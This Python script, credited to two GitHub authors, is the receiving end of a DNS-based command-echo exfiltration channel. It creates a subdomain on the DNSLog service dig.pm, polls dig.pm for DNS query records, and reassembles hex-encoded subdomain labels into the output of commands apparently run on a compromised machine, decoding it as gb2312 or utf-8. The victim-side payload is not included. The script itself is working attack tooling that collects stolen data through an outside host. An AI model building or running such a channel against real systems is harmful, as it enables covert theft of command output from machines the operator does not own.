import time
import requests
import json
import binascii

# author: 617sec //https://github.com/Dr-S1x17
# author: sv3nbeast //https://github.com/sv3nbeast/DnslogCmdEcho

requestTime = 3 # DNSLog platform interval per request
commandHex = {}


def get_new_config():
    global domain,token,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce
    url = 'http://dig.pm/new_gen'
    data = { 'domain' : 'dns.1433.eu.org.' }
    dataResult = json.loads(requests.post(url, data=data).text)
    domain = dataResult['domain']
    token = dataResult['token']
    with open('config617','w') as f:
        f.write(dataResult['domain'])
    lastFinishTime = time.strftime("%Y-%m-%d %X", time.localtime()) # record last finish time
    commandStartPos = 0
    commandEndPos = 0
    lastRecordLen = 0
    finishOnce = False
    
# get DNSLog data 
def get_dnslogdata() -> list:
    if commandStartPos and commandEndFlag: 
        commandHex[commandName].extend([result[length-1][1]['subdomain'] 
                                        for length in range(len(result),commandStartPos,-1) 
                                        if result[length-1][1]['subdomain'].count('.') == 7])
                                        # Get the command part of the DNSLog data
        tempList = []
        for length in range(commandStartPos,-1,-1):
            if result[length-1][1]['time'] < lastFinishTime:break
            if result[length-1][1]['subdomain'].count('.') == 7:
                tempList.append(result[length-1][1]['subdomain']) 
        commandHex[commandName].extend(tempList)

        return commandHex[commandName]

# deal with DNSlog data, Format the output
def deal_data(data: list):
    global finishOnce
    if commandStartPos and commandEndFlag:
        for length in range(commandStartPos,-1,-1):
            if result[length-1][1]['time'] < lastFinishTime:break
            if result[length-1][1]['subdomain'].count('.') == 7:
                commandHex[commandName].append(result[length-1][1]['subdomain'])
        try:
            hexCommand = { item[:4] : item[4:] for item in commandHex[commandName] } 

            hexCommand = sorted(hexCommand.items(), key=lambda x: int(x[0], 16))

            hexCommand = [ item[1][:32] for item in hexCommand]
        except:
            print('!!!!Error Command format! Try to find DNSLog site(http://dig.pm/get_results) to get conntent..')
            pass
        hexCommand[-1] = ''.join(hexCommand[-1].split('0d0a')[:-1])
        commandResult = ''.join(hexCommand)
        # print(commandResult)
        try:
            commandResult = commandResult.split("0a3131")
            commandResult = commandResult[0] #兼容linux命令
        except:
            pass
        print('\n----Command Result----')
        Head = '\033[36m'
        End = '\033[0m'
        try:
            try:#gb2312解码
                print(Head + binascii.a2b_hex(commandResult).decode('gb2312') + End)
            except UnicodeDecodeError:#utf-8解码 linux存在中文字符需要这个解码
                print(Head + binascii.a2b_hex(commandResult).decode('utf-8') + End)
        except:
            print('Maybe use START to execute commands and cause DNSLog records to be lost..\nIt is recommended to remove START from the command')
        print('----Get Result End!----')
        finishOnce = True


if __name__ == '__main__':
    get_new_config()
    while True:
        if finishOnce:   
            get_new_config()

        for i in range(requestTime,-1,-1):
            print('\r', 'Wait DNSLog data: {}s...'.format(str(i)), end='') 
            time.sleep(1)
        try:
            data = { 'domain':domain, 'token':token }
            url = 'http://dig.pm/get_results'
            #proxies = { 'http':'http://127.0.0.1:8080' }
            result = json.loads(requests.post(url, data=data, proxies=False).text) 
            result = sorted(result.items(), key=lambda x: int(x[0]))
        except:
            print('\r', 'Not Find DNSLog Result!', end='')
            continue
        
        commandStartFlag = 1 if lastRecordLen == len(result) else 0
        lastRecordLen = len(result)
        commandEndFlag = 1 if commandEndPos == len(result) else 0 
        commandEndPos = len(result)
        
        if not commandStartPos and ((result[-1][1]['subdomain'].count('.'))  == 7 or 
                                    commandStartFlag): 
                                    # judge if the DNSLog recording is start
            if result[-1][1]['time'] < lastFinishTime: 
                print('\r', 'Not Find DNSLog Result!', end='')
                continue                     
            commandStartPos = len(result)
            commandName = result[-1][1]['subdomain'].split('.')[1]
            print('\nFind Command Record!...')
            print('----Command: \033[36m{}\033[0m----'.format(commandName))
            commandHex[commandName] = [] 
            print('Wait Command DNSLog Record Finish...')   
        if commandStartPos and ((result[-1][1]['subdomain'].count('.')) != 7 or 
                                commandEndFlag):
                                # judge if the DNSLog recording is over
            commandEndFlag = 1
            #print('Command DNSLog Record Finish...')   

        dataList = get_dnslogdata()
        deal_data(dataList)
        
